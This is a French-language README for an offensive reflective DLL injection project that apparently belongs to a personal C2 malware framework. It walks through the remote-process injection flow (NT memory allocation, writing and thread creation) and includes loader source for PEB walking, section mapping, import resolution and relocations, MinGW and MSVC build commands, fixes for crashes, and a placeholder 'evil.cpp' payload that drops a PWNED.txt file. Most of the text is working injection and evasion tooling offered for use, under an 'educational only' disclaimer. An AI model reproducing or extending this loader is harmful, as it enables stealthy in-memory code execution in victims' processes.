# 🎯 Reflective DLL Injection - Documentation

## Vue d'ensemble

Ce projet implémente une **Reflective DLL Injection** basée sur [ReflectiveLdr](https://github.com/rokups/ReflectiveLdr) de rokups, elle-même basée sur le travail original de [Stephen Fewer](https://github.com/stephenfewer/ReflectiveDLLInjection).

La technique permet de charger une DLL **entièrement en mémoire** sans jamais toucher le disque et sans utiliser `LoadLibrary` — la DLL se charge elle-même !

---

## 📁 Structure des fichiers

```
reflective_dll/
├── evil.cpp              # Ta payload (DllMain)
├── ReflectiveLdr.cpp     # Le loader reflectif (modifié)
├── ReflectiveLdr.h       # Header public
├── ReflectiveLdr_p.h     # Header privé (structures PE, PEB, etc.)
└── README.md             # Cette documentation
```

---

## 🔄 Comment ça fonctionne

### Flow complet

```
┌─────────────────────────────────────────────────────────────────────────┐
│                         LOADER RUST                                     │
├─────────────────────────────────────────────────────────────────────────┤
│  1. Lit evil.dll (bytes bruts)                                          │
│  2. Parse le PE pour trouver l'export "ReflectiveLoader"                │
│  3. Convertit le RVA en offset fichier                                  │
│  4. NtAllocateVirtualMemory dans le process cible                       │
│  5. NtWriteVirtualMemory (copie la DLL brute)                           │
│  6. NtProtectVirtualMemory (RW → RX)                                    │
│  7. NtCreateThreadEx à l'adresse: base + offset_ReflectiveLoader        │
│     └── Passe base_address en lpParameter                               │
└─────────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────────┐
│                    DANS LE PROCESS CIBLE                                │
├─────────────────────────────────────────────────────────────────────────┤
│  ReflectiveLoader(lpParameter = base_address):                          │
│    1. Utilise lpParameter comme adresse de base de la DLL               │
│    2. Crée un objet Ldr                                                 │
│       └── LoadApi() : trouve kernel32, ntdll via PEB                    │
│    3. MapImageAndExecute():                                             │
│       a. Alloue mémoire pour la DLL "propre"                            │
│       b. Copie les headers PE                                           │
│       c. Copie chaque section (.text, .data, etc.)                      │
│       d. Résout les imports (LoadLibraryA, GetProcAddress)              │
│       e. Applique les relocations                                       │
│       f. Appelle DllMain(DLL_PROCESS_ATTACH)                            │
│                         │                                               │
│                         ▼                                               │
│               Ta payload s'exécute !                                    │
└─────────────────────────────────────────────────────────────────────────┘
```

### Pourquoi "Reflective" ?

La DLL contient son propre loader — elle sait comment se charger en mémoire sans l'aide de Windows. C'est de la "réflexion" : le code s'analyse et se charge lui-même.

---

## 📝 Explication du code C++

### ReflectiveLdr.h

Définit l'API publique :

```cpp
namespace Reflective {
    class Ldr {
    public:
        // Charge une DLL depuis la mémoire
        HMODULE MapImageAndExecute(LPCVOID lpImage, LPVOID lpParameter);

        // Résout les imports (comme GetProcAddress mais pour modules reflectifs)
        FARPROC GetProcAddress(HMODULE hModule, LPCSTR lpProcName);

        // Trouve le PEB du process
        void* GetPEB();

        // ... autres méthodes
    };
}

// L'export principal — point d'entrée pour l'injection
extern "C" __declspec(dllexport) HMODULE WINAPI ReflectiveLoader(LPVOID lpParameter);
```

### ReflectiveLdr_p.h

Contient les structures internes Windows non documentées :

```cpp
// Structure du Process Environment Block
typedef struct __PEB {
    BYTE bInheritedAddressSpace;
    BYTE bReadImageFileExecOptions;
    BYTE bBeingDebugged;
    // ...
    PPEB_LDR_DATA pLdr;  // ← Liste des DLLs chargées
    // ...
} _PEB;

// Structure pour parcourir les modules chargés
typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderModuleList;
    // ...
    PVOID DllBase;      // ← Adresse de base du module
    UNICODE_STR BaseDllName;  // ← Nom du module
    // ...
} LDR_DATA_TABLE_ENTRY;
```

### ReflectiveLdr.cpp

#### Fonction principale : `ReflectiveLoader`

```cpp
__declspec(dllexport) HMODULE WINAPI ReflectiveLoader(LPVOID lpParameter)
{
    ULONG_PTR uiLibraryAddress;

    // Si lpParameter fourni (injection remote), l'utiliser directement
    if (lpParameter != NULL)
    {
        uiLibraryAddress = (ULONG_PTR)lpParameter;
    }
    else
    {
        // Sinon, scanner la mémoire pour trouver notre base (cas local)
        uiLibraryAddress = Reflective::caller();
        for (;;) {
            if (/* trouvé MZ/PE */) break;
            uiLibraryAddress--;
        }
    }

    Reflective::Ldr ldr;
    return ldr.MapImageAndExecute((LPVOID)uiLibraryAddress, NULL);
}
```

#### Classe `Ldr`

**Constructeur** : Initialise les listes et charge l'API Windows

```cpp
Ldr::Ldr() : _api(0)
{
    InitializeListHead(&_reflectiveModules);
    InitializeListHead(&_importAlternatives);
    InitializeListHead(&_cachedModules);
    LoadApi();  // Trouve kernel32, ntdll
}
```

**LoadApi()** : Parcourt le PEB pour trouver les fonctions nécessaires

```cpp
void Ldr::LoadApi()
{
    auto pPEB = (_PPEB)GetPEB();
    PPEB_LDR_DATA pLdr = pPEB->pLdr;

    // Parcourt la liste des modules chargés
    PLDR_DATA_TABLE_ENTRY pLdrEntry = ...;

    while (pLdrEntry) {
        DWORD dllNameHash = hashW(&pLdrEntry->BaseDllName);

        if (dllNameHash == KERNEL32DLL_HASH) {
            // Trouve LoadLibraryA, GetProcAddress, VirtualAlloc, etc.
            api.LoadLibraryA = GetProcAddressR(bpDllBase, "LoadLibraryA");
            api.GetProcAddress = GetProcAddressR(bpDllBase, "GetProcAddress");
            // ...
        }
        pLdrEntry = /* suivant */;
    }
}
```

**GetPEB()** : Accède au PEB via le segment GS (x64)

```cpp
void* Ldr::GetPEB()
{
#if REFLECTIVEDLL_WIN64
    return (void*)__readgsqword(0x60);
#elif REFLECTIVEDLL_WIN32
    return (void*)__readfsdword(0x30);
#elif REFLECTIVEDLL_WINARM
    return (void*)*(DWORD *)( (BYTE *)_MoveFromCoprocessor( 15, 0, 13, 0, 2 ) + 0x30 );
#endif
}
```

**MapImageAndExecute()** : Le cœur du loader

```cpp
HMODULE Ldr::MapImageAndExecute(LPCVOID lpImage, LPVOID lpParameter)
{
    // 1. Alloue mémoire pour l'image
    auto pbNewBase = (PBYTE)alloc(pNtHdr->OptionalHeader.SizeOfImage, PAGE_EXECUTE_READWRITE);

    // 2. Copie les headers
    memcpy_i(pbNewBase, lpImage, pNtHdr->OptionalHeader.SizeOfHeaders);

    // 3. Copie chaque section
    for (WORD i = 0; i < pNtHdr->FileHeader.NumberOfSections; i++, pSection++)
        memcpy_i(pbNewBase + pSection->VirtualAddress,
                 (PBYTE)lpImage + pSection->PointerToRawData,
                 pSection->SizeOfRawData);

    // 4. Résout les imports
    while (pImport->Name) {
        HMODULE hDep = LoadLibrary(cpLibraryName);
        // Résout chaque fonction importée
        while (pThunkFirst->u1.Function) {
            pThunkFirst->u1.Function = GetProcAddress(hDep, cpName);
            pThunkFirst++;
        }
        pImport++;
    }

    // 5. Applique les relocations
    while (pReloc->SizeOfBlock) {
        // Ajuste les adresses selon la nouvelle base
        *(ULONG_PTR*)(relocVA + pRelocBlock->offset) += delta;
        pReloc = /* suivant */;
    }

    // 6. Appelle DllMain
    DLLMAIN pEntryPoint = (DLLMAIN)(pbNewBase + pNtHdr->OptionalHeader.AddressOfEntryPoint);
    pEntryPoint((HINSTANCE)pbNewBase, DLL_PROCESS_ATTACH, lpParameter);

    return (HMODULE)pbNewBase;
}
```

---

## ⚠️ Problèmes de compilation rencontrés

### 1. Export sans nom

**Symptôme** : L'export `ReflectiveLoader` apparaît sans nom dans la table des exports.

**Cause** : MinGW n'exporte pas les noms par défaut.

**Solution** : Ajouter `-Wl,--export-all-symbols`

```bash
x86_64-w64-mingw32-g++ -shared -o evil.dll evil.cpp ReflectiveLdr.cpp \
    -Wl,--export-all-symbols \
    -luser32
```

### 2. Dépendances runtime MinGW

**Symptôme** : La DLL dépend de `libgcc_s_seh-1.dll`, `libstdc++-6.dll`, `libwinpthread-1.dll`.

**Cause** : MinGW lie dynamiquement ses runtime libraries par défaut.

**Solution** : Compilation statique

```bash
x86_64-w64-mingw32-g++ -shared -o evil.dll evil.cpp ReflectiveLdr.cpp \
    -Wl,--export-all-symbols \
    -static-libgcc -static-libstdc++ \
    -Wl,-Bstatic -lwinpthread -Wl,-Bdynamic \
    -luser32
```

### 3. RVA vs File Offset

**Symptôme** : Le thread démarre mais crash immédiatement.

**Cause** : On injecte la DLL **brute** (fichier), pas mappée. Les RVA ne correspondent pas aux offsets fichier.

**Solution** : Convertir le RVA de `ReflectiveLoader` en offset fichier côté loader Rust.

```
RVA 0x3075 dans .text (RVA 0x1000, File offset 0x600)
→ Offset dans section: 0x3075 - 0x1000 = 0x2075
→ File offset: 0x600 + 0x2075 = 0x2675
```

---

## 🛠️ Compilation

### Depuis macOS (cross-compilation MinGW)

```bash
cd ~/Workspace/Malware/FrameworkC2/reflective_dll

x86_64-w64-mingw32-g++ -shared -o evil.dll evil.cpp ReflectiveLdr.cpp \
    -Wl,--export-all-symbols \
    -static \
    -luser32
```

### Depuis Windows (Visual Studio)

```cmd
cd C:\path\to\reflective_dll
cl /LD /O2 evil.cpp ReflectiveLdr.cpp user32.lib /Fe:evil.dll
```

### Vérification des imports

```bash
# macOS
x86_64-w64-mingw32-objdump -p evil.dll | grep -i "DLL Name"

# Windows
dumpbin /imports evil.dll
```

**Attendu** : Seulement `KERNEL32.dll` (et `api-ms-win-crt-*` sur Win10+)

### Vérification des exports

```bash
# macOS
x86_64-w64-mingw32-objdump -p evil.dll | grep -A 50 "Ordinal/Name"

# Windows
dumpbin /exports evil.dll
```

**Attendu** : `ReflectiveLoader` doit apparaître avec son nom

---

## 🎯 evil.cpp — Ta payload

```cpp
#include "ReflectiveLdr.h"
#include <windows.h>

EXPORT_REFLECTIVE_LOADER

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved)
{
    if (reason == DLL_PROCESS_ATTACH)
    {
        // Ta payload ici !
        HANDLE hFile = CreateFileA(
            "C:\\Users\\Public\\PWNED.txt",
            GENERIC_WRITE, 0, NULL,
            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL
        );
        if (hFile != INVALID_HANDLE_VALUE)
        {
            WriteFile(hFile, "GG!", 3, NULL, NULL);
            CloseHandle(hFile);
        }
    }
    return TRUE;
}
```

---

## 🔍 Debugging

### Technique du crash intentionnel

Pour vérifier qu'on atteint une certaine ligne :

```cpp
int* crash = (int*)0xDEADBEEF; *crash = 1;  // ACCESS VIOLATION
```

- **Process crash** → On atteint cette ligne
- **Process survit** → On n'atteint jamais cette ligne

### Process Explorer

- Onglet **Threads** pour voir les threads créés
- Le thread devrait apparaître brièvement avec `ntdll.dll!RtlUserThreadStart`

---

## 📚 Ressources

- [ReflectiveLdr (rokups)](https://github.com/rokups/ReflectiveLdr) — Base de ce projet
- [ReflectiveDLLInjection (Stephen Fewer)](https://github.com/stephenfewer/ReflectiveDLLInjection) — Original
- [Red Team Notes - Reflective DLL Injection](https://www.ired.team/offensive-security/code-injection-process-injection/reflective-dll-injection)

---

## ⚠️ Disclaimer

**USAGE ÉDUCATIF UNIQUEMENT**

Ce projet est destiné à l'apprentissage de la sécurité offensive et des techniques d'évasion. Toute utilisation malveillante est illégale.
